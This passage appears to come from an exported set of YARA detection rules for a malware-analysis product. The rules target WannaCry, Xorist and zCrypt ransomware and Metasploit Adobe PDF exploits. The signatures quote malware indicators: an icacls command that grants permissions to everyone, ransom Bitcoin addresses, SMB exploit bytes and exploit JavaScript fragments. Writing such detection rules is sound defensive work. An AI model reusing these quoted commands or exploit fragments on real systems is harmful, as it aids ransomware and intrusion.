= { 52 61 72 21 1A 07 01 00 }\n        $zip1 = { 50 4B 03 04 }\n        $zip2 = { 50 4B 05 06 }\n\n    condition:\n        ($rar or $rar5 or $zip1 or $zip2 at 0)\n        and\n        (\n            $mark1 at (filesize-247)\n            or $mark2 at (filesize-248)\n        )\n        and math.entropy(0,200) > 6.5\n}\n\nrule WannaCry_Ransomware\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware\"\n        ref = \"https://goo.gl/HG2j5T\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth (with the help of binar.ly)\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WannaCry_Ransomware\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \"icacls . /grant Everyone:F /T /C /Q\" fullword ascii\n        $x2 = \"taskdl.exe\" fullword ascii\n        $x3 = \"tasksche.exe\" fullword ascii\n        $x4 = \"Global\\\\MsWinZonesCacheCounterMutexA\" fullword ascii\n        $x5 = \"WNcry@2ol7\" fullword ascii\n        $x6 = \"www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\" ascii\n        $x7 = \"mssecsvc.exe\" fullword ascii\n        $x8 = \"C:\\\\%s\\\\qeriuwjhrf\" fullword ascii\n        $x9 = \"icacls . /grant Everyone:F /T /C /Q\" fullword ascii\n        $s1 = \"C:\\\\%s\\\\%s\" fullword ascii\n        $s2 = \"<!-- Windows 10 --> \" fullword ascii\n        $s3 = \"cmd.exe /c \\\"%s\\\"\" fullword ascii\n        $s4 = \"msg/m_portuguese.wnry\" fullword ascii\n        $s5 = \"\\\\\\\\192.168.56.20\\\\IPC$\" fullword wide\n        $s6 = \"\\\\\\\\172.16.99.5\\\\IPC$\" fullword wide\n        $op1 = { 10 ac 72 0d 3d ff ff 1f ac 77 06 b8 01 00 00 00 }\n        $op2 = { 44 24 64 8a c6 44 24 65 0e c6 44 24 66 80 c6 44 }\n        $op3 = { 18 df 6c 24 14 dc 64 24 2c dc 6c 24 5c dc 15 88 }\n        $op4 = { 09 ff 76 30 50 ff 56 2c 59 59 47 3b 7e 0c 7c }\n        $op5 = { c1 ea 1d c1 ee 1e 83 e2 01 83 e6 01 8d 14 56 }\n        $op6 = { 8d 48 ff f7 d1 8d 44 10 ff 23 f1 23 c1 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 10000KB and (1 of ($x*) and 1 of ($s*) or 3 of ($op*))\n}\n\nrule WannaCry_Ransomware_Gen\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware\"\n        ref = \"https://www.us-cert.gov/ncas/alerts/TA17-132A\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth (based on rule by US CERT)\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WannaCry_Ransomware_Gen\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"__TREEID__PLACEHOLDER__\" fullword ascii\n        $s2 = \"__USERID__PLACEHOLDER__\" fullword ascii\n        $s3 = \"Windows for Workgroups 3.1a\" fullword ascii\n        $s4 = \"PC NETWORK PROGRAM 1.0\" fullword ascii\n        $s5 = \"LANMAN1.0\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 5000KB and all of them\n}\n\nrule WannCry_m_vbs\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware VBS\"\n        ref = \"https://goo.gl/HG2j5T\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WannCry_m_vbs\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $x1 = \".TargetPath = \\\"C:\\\\@\" ascii\n        $x2 = \".CreateShortcut(\\\"C:\\\\@\" ascii\n        $s3 = \" = WScript.CreateObject(\\\"WScript.Shell\\\")\" ascii\n\n    condition:\n        (uint16(0) == 0x4553 and filesize < 1KB and all of them)\n}\n\nrule WannCry_BAT\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware Batch file\"\n        ref = \"https://goo.gl/HG2j5T\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WannCry_BAT\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"@.exe\\\">> m.vbs\" ascii\n        $s2 = \"cscript.exe //nologo m.vbs\" fullword ascii\n        $s3 = \"echo SET ow = WScript.CreateObject(\\\"WScript.Shell\\\")> \" ascii\n        $s4 = \"echo om.Save>> m.vbs\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x6540 and filesize < 1KB and 1 of them)\n}\n\nrule WannaCry_RansomNote\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware note\"\n        ref = \"https://goo.gl/HG2j5T\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"WannaCry_RansomNote\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"A:  Don't worry about decryption.\" fullword ascii\n        $s2 = \"Q:  What's wrong with my files?\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x3a51 and filesize < 2KB and all of them)\n}\n\nrule lazaruswannacry\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware\"\n        ref = \"https://twitter.com/neelmehta/status/864164081116225536\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Costin G. Raiu, Kaspersky Lab\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"lazaruswannacry\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $a1 = { 51 53 55 8B 6C 24 10 56 57 6A 20 8B 45 00 8D 75\n         04 24 01 0C 01 46 89 45 00 C6 46 FF 03 C6 06 01 46\n         56 E8 }\n        $a2 = { 03 00 04 00 05 00 06 00 08 00 09 00 0A 00 0D 00\n         10 00 11 00 12 00 13 00 14 00 15 00 16 00 2F 00\n         30 00 31 00 32 00 33 00 34 00 35 00 36 00 37 00\n         38 00 39 00 3C 00 3D 00 3E 00 3F 00 40 00 41 00\n         44 00 45 00 46 00 62 00 63 00 64 00 66 00 67 00\n         68 00 69 00 6A 00 6B 00 84 00 87 00 88 00 96 00\n         FF 00 01 C0 02 C0 03 C0 04 C0 05 C0 06 C0 07 C0\n         08 C0 09 C0 0A C0 0B C0 0C C0 0D C0 0E C0 0F C0\n         10 C0 11 C0 12 C0 13 C0 14 C0 23 C0 24 C0 27 C0\n         2B C0 2C C0 FF FE }\n\n    condition:\n        uint16(0) == 0x5A4D and filesize < 15000000 and all of them\n}\n\nrule MS17_010_WanaCry_worm\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware\"\n        ref = \"https://www.exploit-db.com/exploits/41987/\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Felipe Molina (@felmoltor)\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"MS17_010_WanaCry_worm\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $ms17010_str1 = \"PC NETWORK PROGRAM 1.0\"\n        $ms17010_str2 = \"LANMAN1.0\"\n        $ms17010_str3 = \"Windows for Workgroups 3.1a\"\n        $ms17010_str4 = \"__TREEID__PLACEHOLDER__\"\n        $ms17010_str5 = \"__USERID__PLACEHOLDER__\"\n        $wannacry_payload_substr1 = \"h6agLCqPqVyXi2VSQ8O6Yb9ijBX54j\"\n        $wannacry_payload_substr2 = \"h54WfF9cGigWFEx92bzmOd0UOaZlM\"\n        $wannacry_payload_substr3 = \"tpGFEoLOU6+5I78Toh/nHs/RAP\"\n\n    condition:\n        all of them\n}\n\nrule WannaDecryptor : WannaDecryptor\n{\n    meta:\n        description = \"WannaDecryptor ransomware\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WannaDecryptor\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $id1 = \"taskdl.exe\"\n        $id2 = \"taskse.exe\"\n        $id3 = \"r.wnry\"\n        $id4 = \"s.wnry\"\n        $id5 = \"t.wnry\"\n        $id6 = \"u.wnry\"\n        $id7 = \"msg/m_\"\n\n    condition:\n        3 of them\n}\n\nrule Wanna_Sample_84c82835a5d21bbcf75a61706d8ab549 : Wanna_Sample_84c82835a5d21bbcf75a61706d8ab549\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Wanna_Sample_84c82835a5d21bbcf75a61706d8ab549\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $taskdl = { 00 74 61 73 6b 64 6c }\n        $taskse = { 00 74 61 73 6b 73 65 }\n\n    condition:\n        $taskdl at 3419456 and $taskse at 3422953\n}\n\nrule Wanna_Sample_4da1f312a214c07143abeeafb695d904 : Wanna_Sample_4da1f312a214c07143abeeafb695d904\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Wanna_Sample_4da1f312a214c07143abeeafb695d904\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $rwnry = { 72 2e 77 72 79 }\n        $swnry = { 73 2e 77 72 79 }\n\n    condition:\n        $rwnry at 88195 and $swnry at 88656 and $rwnry at 4495639\n}\n\nrule NHS_Strain_Wanna : NHS_Strain_Wanna\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"NHS_Strain_Wanna\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $cwnry = { 63 2e 77 6e 72 79 }\n        $twnry = { 74 2e 77 6e 72 79 }\n\n    condition:\n        $cwnry at 262324 and $twnry at 267672 and $cwnry at 284970\n}\n\nrule ransom_telefonica : TELEF\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware\"\n        ref = \"http://www.elmundo.es/tecnologia/2017/05/12/59158a8ce5fdea194f8b4616.html\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Jaume Martin <@Xumeiquer>\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"ransom_telefonica\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $a = \"RegCreateKeyW\" wide ascii nocase\n        $b = \"cmd.exe /c\"\n        $c = \"115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn\" ascii\n        $d = \"12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw\" ascii\n        $e = \"13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94\" ascii\n        $f = \"tasksche.exe\"\n\n    condition:\n        uint16(0) == 0x5A4D and $a and for all of ($b , $c , $d , $e , $f) : (@ > @a)\n}\n\nrule Wanna_Cry_Ransomware_Generic\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"US-CERT Code Analysis Team\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"Wanna_Cry_Ransomware_Generic\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s0 = {410044004D0049004E0024}\n        $s1 = \"WannaDecryptor\"\n        $s2 = \"WANNACRY\"\n        $s3 = \"Microsoft Enhanced RSA and AES Cryptographic\"\n        $s4 = \"PKS\"\n        $s5 = \"StartTask\"\n        $s6 = \"wcry@123\"\n        $s7 = {2F6600002F72}\n        $s8 = \"unzip 0.15 Copyrigh\"\n        $s9 = \"Global\\\\WINDOWS_TASKOSHT_MUTEX\"\n        $s10 = \"Global\\\\WINDOWS_TASKCST_MUTEX\"\n        $s11 = {7461736B736368652E657865000000005461736B5374617274000000742E776E7279000069636163}\n        $s12 = {6C73202E202F6772616E742045766572796F6E653A46202F54202F43202F5100617474726962202B68}\n        $s13 = \"WNcry@2ol7\"\n        $s14 = \"wcry@123\"\n        $s15 = \"Global\\\\MsWinZonesCacheCounterMutexA\"\n\n    condition:\n        $s0 and $s1 and $s2 and $s3 or $s4 and $s5 and $s6 and $s7 or $s8 and $s9 and $s10 or $s11 and $s12 or $s13 or $s14 or $s15\n}\n\nrule WannaCry_Ransomware_Dropper\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware dropper\"\n        ref = \"https://www.cylance.com/en_us/blog/threat-spotlight-inside-the-wannacry-attack.html\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WannaCry_Ransomware_Dropper\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"cmd.exe /c \\\"%s\\\"\" fullword ascii\n        $s2 = \"tasksche.exe\" fullword ascii\n        $s3 = \"icacls . /grant Everyone:F /T /C /Q\" fullword ascii\n        $s4 = \"Global\\\\MsWinZonesCacheCounterMutexA\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 4MB and all of them\n}\n\nrule WannaCry_SMB_Exploit\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware SMB Exploit\"\n        ref = \"https://www.cylance.com/en_us/blog/threat-spotlight-inside-the-wannacry-attack.html\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"WannaCry_SMB_Exploit\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = { 53 4D 42 72 00 00 00 00 18 53 C0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 FF FE 00 00 40 00 00 62 00 02 50 43 20 4E 45 54 57 4F 52 4B 20 50 52 4F 47 52 41 4D 20 31 2E 30 00 02 4C 41 4E 4D 41 4E 31 2E 30 00 02 57 69 6E 64 6F 77 73 20 66 6F 72 20 57 6F 72 6B 67 72 6F 75 70 73 20 33 2E 31 61 00 02 4C 4D 31 2E 32 58 30 30 32 00 02 4C 41 4E 4D 41 4E 32 2E 31 00 02 4E 54 20 4C 4D 20 30 2E 31 32 00 00 00 00 00 00 00 88 FF 53 4D 42 73 00 00 00 00 18 07 C0 }\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 4MB and all of them and pe.imports(\"ws2_32.dll\" , \"connect\") and pe.imports(\"ws2_32.dll\" , \"send\") and pe.imports(\"ws2_32.dll\" , \"recv\") and pe.imports(\"ws2_32.dll\" , \"socket\") and pe.imports(\"ws2_32.dll\" , \"closesocket\")\n}\n\nrule wannacry_static_ransom : wannacry_static_ransom\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware\"\n        ref = \"https://blueliv.com/research/wannacrypt-malware-analysis/\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Blueliv\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"wannacry_static_ransom\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $mutex01 = \"Global\\\\MsWinZonesCacheCounterMutexA\" ascii\n        $lang01 = \"m_bulgarian.wnr\" ascii\n        $lang02 = \"m_vietnamese.wnry\" ascii\n        $startarg01 = \"StartTask\" ascii\n        $startarg02 = \"TaskStart\" ascii\n        $startarg03 = \"StartSchedule\" ascii\n        $wcry01 = \"WanaCrypt0r\" ascii wide\n        $wcry02 = \"WANACRY\" ascii\n        $wcry03 = \"WANNACRY\" ascii\n        $wcry04 = \"WNCRYT\" ascii wide\n        $forig01 = \".wnry\\x00\" ascii\n        $fvar01 = \".wry\\x00\" ascii\n\n    condition:\n        ($mutex01 or any of ($lang*)) and ($forig01 or all of ($fvar*)) and any of ($wcry*) and any of ($startarg*)\n}\n\nrule wannacry_memory_ransom : wannacry_memory_ransom\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware\"\n        ref = \"https://blueliv.com/research/wannacrypt-malware-analysis/\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Blueliv\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"wannacry_memory_ransom\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s01 = \"%08X.eky\"\n        $s02 = \"%08X.pky\"\n        $s03 = \"%08X.res\"\n        $s04 = \"%08X.dky\"\n        $s05 = \"@WanaDecryptor@.exe\"\n\n    condition:\n        all of them\n}\n\nrule worm_ms17_010 : worm_ms17_010\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware\"\n        ref = \"https://blueliv.com/research/wannacrypt-malware-analysis/\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Blueliv\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"worm_ms17_010\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s01 = \"__TREEID__PLACEHOLDER__\" ascii\n        $s02 = \"__USERID__PLACEHOLDER__@\" ascii\n        $s03 = \"SMB3\"\n        $s05 = \"SMBu\"\n        $s06 = \"SMBs\"\n        $s07 = \"SMBr\"\n        $s08 = \"%s -m security\" ascii\n        $s09 = \"%d.%d.%d.%d\"\n        $payloadwin2000_2195 = \"\\x57\\x00\\x69\\x00\\x6e\\x00\\x64\\x00\\x6f\\x00\\x77\\x00\\x73\\x00\\x20\\x00\\x32\\x00\\x30\\x00\\x30\\x00\\x30\\x00\\x20\\x00\\x32\\x00\\x31\\x00\\x39\\x00\\x35\\x00\\x00\\x00\"\n        $payload2000_50 = \"\\x57\\x00\\x69\\x00\\x6e\\x00\\x64\\x00\\x6f\\x00\\x77\\x00\\x73\\x00\\x20\\x00\\x32\\x00\\x30\\x00\\x30\\x00\\x30\\x00\\x20\\x00\\x35\\x00\\x2e\\x00\\x30\\x00\\x00\\x00\"\n\n    condition:\n        all of them\n}\n\nrule ransomware_windows_wannacry\n{\n    meta:\n        description = \"WannaCry / WannaCryptor ransomware\"\n        ref = \"https://securelist.com/blog/incidents/78351/wannacry-ransomware-used-in-widespread-attacks-all-over-the-world/\"\n        classifications = \"Worm, Ransomware\"\n        threat_names = \"WannaCry\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"ransomware_windows_wannacry\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $a1 = \"msg/m_chinese\" wide ascii\n        $a2 = \".wnry\" wide ascii\n        $a3 = \"attrib +h\" wide ascii\n        $b1 = \"WNcry@2ol7\" wide ascii\n        $b2 = \"iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\" wide ascii\n        $b3 = \"115p7UMMngoj1pMvkpHijcRdfJNXj6LrLn\" wide ascii\n        $b4 = \"12t9YDPgwueZ9NyMgw519p7AA8isjr6SMw\" wide ascii\n        $b5 = \"13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94\" wide ascii\n\n    condition:\n        uint16(0) == 0x5a4d and (all of ($a*) or any of ($b*))\n}\n\nrule Xorist\n{\n    meta:\n        description = \"Xorist Ransomware\"\n        classifications = \"Ransomware\"\n        threat_names = \"Xorist\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n        sample = \"5496DAD0740A5339A2C0B9530BE25A805E6D523B9FD452F1E2ED9B8B80BDB3C5\"\n\n    strings:\n        $s1 = \"0p3nSOurc3 X0r157\"\n        $s2 = \"your data is irrevocably broken\"\n        $s3 = \"Files have been decrypted successfully!\"\n        $s4 = \"All your files were encrypted!\"\n        $e1 = {CF E0 F0 EE EB FC E2 E2 E5 E4 B8 ED}\n        $e2 = {C2 ED E8 EC E0 ED E8 E5}\n        $e3 = {CE F8 E8 E1 EA E0}\n        $e4 = {D4 E0 E9 EB FB F3 F1 EF E5 F8 ED EE F0 E0 F1 F8 E8 F4 F0 EE E2 E0 ED FB}\n        $key_const = {B9 79 37 9e}\n        $key_gen1 = {1a 21 e6 e6 e8 a0 db cc b0 59 bf 82 8e a5 ef 7e}\n\n    condition:\n        (\n            mime_type == \"application/octet-stream\"\n            or (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)\n        )\n        and 2 of ($s*) and 2 of ($e*)\n        and $key_const\n        and $key_gen1\n}\n\nrule zCrypt\n{\n    meta:\n        description = \"zCrypt ransomware\"\n        ref = \"https://blog.malwarebytes.com/threat-analysis/2016/06/zcrypt-ransomware/\"\n        classifications = \"Ransomware\"\n        threat_names = \"zCrypt\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"@fusionrace\"\n        source = \"https://github.com/airbnb/binaryalert\"\n        original_name = \"ransomware_windows_zcrypt\"\n        license = \"Apache-2.0 (https://opensource.org/licenses/Apache-2.0)\"\n\n    strings:\n        $u1 = \"How to Buy Bitcoins\" ascii wide\n        $u2 = \"ALL YOUR PERSONAL FILES ARE ENCRYPTED\" ascii wide\n        $u3 = \"Click Here to Show Bitcoin Address\" ascii wide\n        $u4 = \"MyEncrypter2.pdb\" fullword ascii wide\n        $g1 = \".p7b\" fullword ascii wide\n        $g2 = \".p7c\" fullword ascii wide\n        $g3 = \".pdd\" fullword ascii wide\n        $g4 = \".pef\" fullword ascii wide\n        $g5 = \".pem\" fullword ascii wide\n        $g6 = \"How to decrypt files.html\" fullword ascii wide\n\n    condition:\n        any of ($u*) or all of ($g*)\n}",
      "send_mail": false,
      "shareable": true
    },
    "2": {
      "builtin": true,
      "builtin_name": "CVEs",
      "created": "2020-05-10 14:25:02.654965",
      "id": 2,
      "modified": "2020-08-27 12:53:30.317270",
      "name": "CVEs",
      "owner_user_id": null,
      "rules": "\n\nrule MSF_adobe_collectemailinfo\n{\n    meta:\n        description = \"Metasploit adobe_collectemailinfo exploit for CVE-2007-5659\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2007-5659\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s = /this\\.collabStore = Collab\\.collectEmailInfo\\(\\{subj: \"\",msg: [a-zA-Z0-9]{1,101}\\}\\);/\n\n    condition:\n        analysis_id == \"pdf\" and mime_type == \"text/javascript\"\n        and $s\n}\n\nrule Possible_CVE_2007_5659\n{\n    meta:\n        description = \"Possible exploit for CVE-2007-5659 (Adobe Collab.collectEmailInfo() Buffer Overflow)\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = \"this.collabStore\" fullword\n        $s2 = \"Collab.collectEmailInfo\" fullword\n\n    condition:\n        analysis_id == \"pdf\" and mime_type == \"text/javascript\"\n        and not MSF_adobe_collectemailinfo\n        and all of them\n}\n\nrule MSF_adobe_utilprintf\n{\n    meta:\n        description = \"Metasploit adobe_utilprintf exploit for CVE-2008-2992\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2008-2992\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s = \"util.printf(\\\"%45000.45000f\\\", 0)\"\n\n    condition:\n        analysis_id == \"pdf\" and mime_type == \"text/javascript\"\n        and $s\n}\n\nrule MSF_adobe_geticon\n{\n    meta:\n        description = \"Metasploit adobe_geticon exploit for CVE-2009-0927\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2009-0927\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        $s1 = /Collab\\.getIcon\\([a-zA-Z0-9]{1,101}\\);/\n        $s2 = \"unescape(\\\"%0a\\\");\"\n        $s3 = /\"N\\.\"\\+[a-zA-Z0-9]{1,101};/\n\n    condition:\n        analysis_id == \"pdf\" and mime_type == \"text/javascript\"\n        and all of them\n}\n\nrule Possible_CVE_2009_0927\n{\n    meta:\n        description = \"Possible exploit for CVE-2009-0927 (Adobe Collab.getIcon() Buffer Overflow)\"\n        vti_default_score = 3\n        vti_documents_score = 3\n        vti_scripts_score = 3\n        vti_browser_score = 3\n        vti_msi_score = 3\n        vti_static_score = 3\n        author = \"VMRay Labs\"\n\n    strings:\n        $s = \"Collab.getIcon\" fullword\n\n    condition:\n        analysis_id == \"pdf\" and mime_type == \"text/javascript\"\n        and not MSF_adobe_geticon\n        and $s\n}\n\nrule MSF_adobe_flatedecode_predictor02\n{\n    meta:\n        description = \"Metasploit adobe_flatedecode_predictor02 exploit for CVE-2009-3459\"\n        classifications = \"Exploit\"\n        threat_names = \"CVE-2009-3459\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"VMRay Labs\"\n\n    strings:\n        // /Predictor 02\n        $p = {2f (50 | 23 35 30) (72 | 23 37 32) (65 | 23 36 35) (64 | 23 36 34) (69 | 23 36 39) (63 | 23 36 33) (74 | 23 37 34) (6f | 23 36 66) (72 | 23 37 32) 20 30 32}\n        // /Colors 1073741838\n        $c = {2f (43 | 23 34 33) (6f | 23 36 66) (6c | 23 36 63) (6f | 23 36 66) (72 | 23 37 32) (73 | 23 37 33) 20 31 30 37 33 37 34 31 38 33 